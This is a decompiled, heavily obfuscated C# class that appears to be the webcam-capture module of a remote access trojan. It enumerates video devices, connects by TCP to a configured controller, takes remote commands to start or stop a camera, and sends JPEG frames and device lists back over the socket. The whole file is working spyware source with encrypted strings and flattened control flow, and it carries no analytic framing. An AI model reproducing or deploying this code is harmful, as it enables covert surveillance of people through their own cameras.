using System;
using System.Collections;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using AForge.Video;
using AForge.Video.DirectShow;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class __________________________________
{
	private delegate void ___________________________________(string string_0);

	public string __;

	private FilterInfoCollection m____;

	private TcpClient m_____;

	private bool m______;

	private ___________________________________ m_______;

	public StreamWriter _______;

	public StreamReader ________;

	private string m__________;

	public string __________;

	private Bitmap m____________;

	public static object ____________;

	private event ___________________________________ _
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			this.m_______ = (___________________________________)Delegate.Combine(this.m_______, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			this.m_______ = (___________________________________)Delegate.Remove(this.m_______, value);
		}
	}

	public __________________________________()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		this.m____ = new FilterInfoCollection(FilterCategory.VideoInputDevice);
		this.m______ = false;
		this.m__________ = _003CModule_003E.______<string>(3743344457u);
		this.__________ = _003CModule_003E.____<string>(816071137u);
	}

	public void ___(object sender, NewFrameEventArgs e)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 72:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0007:
					num = 2;
					this.m____________ = (Bitmap)((Image)e.get_Frame()).Clone();
					break;
					end_IL_0000_2:
					break;
				}
				num = 3;
				GC.Collect();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 72;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe void ____(string string_0)
	{
		//IL_017f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0189: Expected O, but got Unknown
		//IL_01bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c6: Expected O, but got Unknown
		string string_ = string_0;
		int _______________ = _003CModule_003E.________________;
		nint num2;
		if ((uint)(329 * _______________ + 1719 * _______________) / 82u == 1493426870)
		{
			int num;
			if ((0x7FFFFF | ((uint)_______________ / 672455u % 5327715u)) == 8388607)
			{
				num = sizeof(ushort) + -2053656365;
				num2 = num;
			}
			else
			{
				num = 2058321825;
				num2 = num;
			}
		}
		else
		{
			num2 = (nint)Type.EmptyTypes.LongLength + 14494;
		}
		string_0 = ___________________________________________________________________._(string_, _003CModule_003E.__________((int)num2, sizeof(Guid) + 14840, ((0xEDA ^ ((uint)_______________ / 460502399u)) == 0) ? (sizeof(ushort) + -1410391283) : (((0x4CF | ((uint)_______________ / 509733418u)) == 1231) ? 171 : (sizeof(byte) + -1957030951))));
		try
		{
			string[] array = default(string[]);
			nint num4;
			int num3 = default(int);
			if (string_0.Contains(_003CModule_003E._______<string>(1023697363u)))
			{
				array = Strings.Split(string_0, _003CModule_003E._____<string>(2815274875u), -1, (CompareMethod)0);
				if ((-63 | (53 * num3 + 11 * num3)) == -63)
				{
					num4 = (nint)Type.EmptyTypes.LongLength + 1;
					goto IL_0205;
				}
			}
			goto IL_0226;
			IL_01fa:
			___________();
			goto IL_010d;
			IL_0205:
			while (true)
			{
				switch (num4)
				{
				case 2:
				{
					this._.Start();
					Thread.Sleep(500);
					_____(50);
					int num5 = num3;
					num3 = -27878;
					if (num5 == -24941)
					{
						goto IL_0171;
					}
					goto IL_01d4;
				}
				case 0:
					this._ = new VideoCaptureDevice(this.m____.get_Item(Conversions.ToInteger(array[1])).get_MonikerString());
					if (num3 == -28985)
					{
						goto case 2;
					}
					goto IL_0171;
				case 3:
					break;
				default:
					goto IL_0226;
					IL_0171:
					this._.add_NewFrame(new NewFrameEventHandler(___));
					num3 = (int)((nint)Type.EmptyTypes.LongLength + 18812);
					num4 = sizeof(Guid) + -14;
					continue;
				}
				break;
			}
			goto IL_01fa;
			IL_0226:
			if (Operators.CompareString(string_0, _003CModule_003E._______<string>(2170582594u), false) != 0)
			{
				goto IL_010d;
			}
			num4 = sizeof(short) + 1;
			goto IL_0205;
			IL_01d4:
			num3 = -27878;
			if (Operators.CompareString(string_0, _003CModule_003E.______<string>(3650619900u), false) == 0)
			{
				if (num3 == -2244)
				{
					goto IL_01fa;
				}
				this._.Stop();
			}
			if (string_0.Contains(_003CModule_003E.______<string>(676118163u)))
			{
				_____(Convert.ToInt32(array[1]));
			}
			if (Operators.CompareString(string_0, _003CModule_003E.______<string>(2089308279u), false) != 0)
			{
				return;
			}
			string text = _003CModule_003E.______<string>(2636091126u);
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((CollectionBase)(object)this.m____).GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text, NewLateBinding.LateGet(objectValue, (Type)null, _003CModule_003E._____<string>(967671166u), new object[0], (string[])null, (Type[])null, (bool[])null)), (object)_003CModule_003E._______<string>(3278727275u)));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			MemoryStream memoryStream = default(MemoryStream);
			string[] array2 = default(string[]);
			int num7 = default(int);
			if (-27738 != sizeof(ushort) + -27741)
			{
				memoryStream = new MemoryStream();
				array2 = new string[6]
				{
					_003CModule_003E._____<string>(3686398104u),
					null,
					null,
					null,
					null,
					null
				};
				nint num6 = (nint)Type.EmptyTypes.LongLength + 0;
				while (true)
				{
					switch (num6)
					{
					default:
						array2[1] = this.__________;
						array2[2] = ______________________________________________________________.________________________;
						num7 = -16562;
						if ((((uint)num3 % 524288u) ^ 0x201E68u) != 0)
						{
							break;
						}
						num6 = ((num7 - 1898708992 != (int)((uint)(66 * num7 + num7 * 190) >> 8)) ? ((nint)Type.EmptyTypes.LongLength + -1158271270) : ((nint)Type.EmptyTypes.LongLength + 1205908175));
						continue;
					case 1:
						break;
					}
					break;
				}
			}
			do
			{
				array2[3] = this.__________;
				array2[4] = text;
			}
			while (num7 == -26878);
			array2[5] = this.__________;
			string text2 = string.Concat(array2);
			memoryStream.Write(_________(text2), 0, text2.Length);
			________(memoryStream.ToArray());
			memoryStream.Dispose();
			return;
			IL_010d:
			if (!string_0.Contains(_003CModule_003E._______<string>(4174458318u)))
			{
				goto IL_01d4;
			}
			num3 = (int)((nint)Type.EmptyTypes.LongLength + 601);
			num4 = sizeof(double) + -8;
			goto IL_0205;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void _____(int int_0)
	{
		try
		{
			byte[] array = ______(this.m____________, int_0);
			MemoryStream memoryStream = new MemoryStream();
			string text = _003CModule_003E._____<string>(2636189529u) + this.__________;
			memoryStream.Write(_________(text), 0, text.Length);
			memoryStream.Write(array, 0, array.Length);
			________(memoryStream.ToArray());
			memoryStream.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static byte[] ______(Bitmap bitmap_0, int int_0)
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		EncoderParameters val = default(EncoderParameters);
		EncoderParameter val2 = default(EncoderParameter);
		ImageCodecInfo val3 = default(ImageCodecInfo);
		int num6 = default(int);
		MemoryStream memoryStream = default(MemoryStream);
		byte[] buffer = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					int num5 = _003CModule_003E._____________;
					if ((((uint)num5 / 54u) ^ 0x80001E1Du) != 0)
					{
						goto IL_001a;
					}
					goto IL_00a5;
				}
				case 295:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0022;
						case 4:
							goto IL_0046;
						case 3:
							goto IL_00a5;
						case 5:
							goto IL_00c1;
						case 6:
							goto IL_00cc;
						case 7:
							goto IL_00d5;
						case 8:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 9:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00c1:
					num = 5;
					val.get_Param()[0] = val2;
					goto IL_00cc;
					IL_001a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0022;
					IL_0022:
					num = 2;
					val2 = new EncoderParameter(Encoder.Quality, (long)int_0);
					if ((nint)Type.EmptyTypes.LongLength + -30104 != 28163)
					{
						goto IL_00a5;
					}
					goto IL_00ba;
					IL_00a5:
					num = 3;
					val3 = _____________________________._________________(_003CModule_003E.___<string>(2876655287u));
					goto IL_0046;
					IL_0046:
					num = 4;
					if ((((0xE & (13 * num6 + num6 * 19 - 2910)) != 2) ? (sizeof(float) + -1544405477) : (((-2 | (1098 * num + 3180)) == -2) ? ((nint)Type.EmptyTypes.LongLength + -28500) : ((nint)Type.EmptyTypes.LongLength + 1060804792))) == 14421)
					{
						goto IL_001a;
					}
					goto IL_00ba;
					IL_00ba:
					val = new EncoderParameters(1);
					goto IL_00c1;
					IL_00cc:
					num = 6;
					memoryStream = new MemoryStream();
					goto IL_00d5;
					IL_00d5:
					num = 7;
					((Image)bitmap_0).Save((Stream)memoryStream, val3, val);
					break;
					end_IL_0000_2:
					break;
				}
				num = 8;
				buffer = memoryStream.GetBuffer();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 295;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		byte[] result = buffer;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public unsafe void _______()
	{
		try
		{
			if (!_______________________________________________._)
			{
				return;
			}
			int num2;
			nint num3;
			if (((CollectionBase)(object)this.m____).Count == 0)
			{
				int num = default(int);
				if ((0xFFF00000u & ((uint)num / 4096u)) == 0)
				{
					if (-1377828864 + (-1610612736 * num << 25) * 32 == (int)((uint)num / 87068u))
					{
						goto IL_011d;
					}
					num2 = sizeof(byte) + 0;
					num3 = num2;
				}
				else
				{
					num2 = sizeof(short) + 1281404180;
					num3 = num2;
				}
				goto IL_00e6;
			}
			______________________________________________________________.______________(_003CModule_003E._______<string>(2721646351u), _003CModule_003E._____<string>(891993771u));
			int num4 = 5416;
			if (sizeof(double) + 27820 == 27828)
			{
				this.m_____ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
				this.m_____.ReceiveBufferSize = 9999999;
				if (num4 != -247)
				{
				}
				this.m_____.SendBufferSize = 9999999;
				if (this.m______)
				{
					goto IL_013b;
				}
			}
			goto IL_00f9;
			IL_00f9:
			this.m______ = true;
			_ += ____;
			num3 = (nint)Type.EmptyTypes.LongLength + 2;
			goto IL_00e6;
			IL_011d:
			______________________________________________________________.___________(_003CModule_003E.______<string>(2302520507u));
			Thread.Sleep(5000);
			return;
			IL_013b:
			this.m_____.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, ____________, null);
			Thread.Sleep(500);
			string string_ = _003CModule_003E.____<string>(2946287876u) + ______________________________________________________________.________________________ + _003CModule_003E.____<string>(3008796200u);
			_____________(string_);
			return;
			IL_00e6:
			switch (num2)
			{
			case 0:
				break;
			default:
				goto IL_011d;
			case 2:
				goto IL_013b;
			}
			goto IL_00f9;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.____<string>(1187660804u), _003CModule_003E._______<string>(3249342169u) + ex2.ToString());
			___________();
			ProjectData.ClearProjectError();
		}
	}

	public void ________(byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(byte_0, 0, byte_0.Length);
			memoryStream.Write(_________(this.m__________), 0, this.m__________.Length);
			this.m_____.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			___________();
			ProjectData.ClearProjectError();
		}
	}

	public byte[] _________(string string_0)
	{
		return Encoding.Default.GetBytes(string_0);
	}

	public string __________(byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public unsafe void ___________()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Exception obj2);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					goto IL_0051;
				case 185:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 2:
							break;
						case 3:
							goto IL_0025;
						case 4:
							goto IL_0031;
						case 1:
							goto IL_0051;
						case 5:
							goto IL_005b;
						case 6:
							goto IL_0068;
						case 7:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 8:
							goto end_IL_0000_3;
						}
						goto IL_0003;
					}
					IL_0068:
					num = 6;
					this.________.Close();
					break;
					IL_0051:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0003;
					IL_0003:
					num = 2;
					this._.Stop();
					if ((nint)Type.EmptyTypes.LongLength + 29914 == 29914)
					{
						goto IL_0025;
					}
					goto IL_0051;
					IL_0025:
					num = 3;
					Thread.Sleep(500);
					goto IL_0031;
					IL_0031:
					num = 4;
					this.m_____.Close();
					if (sizeof(int) + -15586 != -15582)
					{
						goto IL_0051;
					}
					goto IL_005b;
					IL_005b:
					num = 5;
					this._______.Close();
					goto IL_0068;
					end_IL_0000_2:
					break;
				}
				num = 7;
				Thread.CurrentThread.Abort();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (((Func<bool>)delegate
			{
				// Could not convert BlockContainer to single expression
				obj2 = obj as Exception;
				__________________________________.____________ = _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 45506), sizeof(ulong) + 47041, (int)((-1799094272 * num2 == 4896) ? (sizeof(ulong) + 354030004) : (((((uint)num2 / 7012310u * 131072) ^ 0xFFFFFD9Du) == 0) ? ((nint)Type.EmptyTypes.LongLength + 1247321110) : ((nint)Type.EmptyTypes.LongLength + 22))));
				return obj2 > null && num3 != 0 && num2 == 0;
			}).Invoke())
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 185;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void ____________(IAsyncResult iasyncResult_0)
	{
		try
		{
			this.________ = new StreamReader(this.m_____.GetStream());
			this.m_______?.Invoke(this.________.ReadLine());
			this.m_____.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, ____________, null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			___________();
			ProjectData.ClearProjectError();
		}
	}

	public void _____________(string string_0)
	{
		try
		{
			this._______ = new StreamWriter(this.m_____.GetStream());
			this._______.WriteLine(_003CModule_003E.______<string>(2701181849u) + string_0);
			this._______.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			___________();
			ProjectData.ClearProjectError();
		}
	}
}
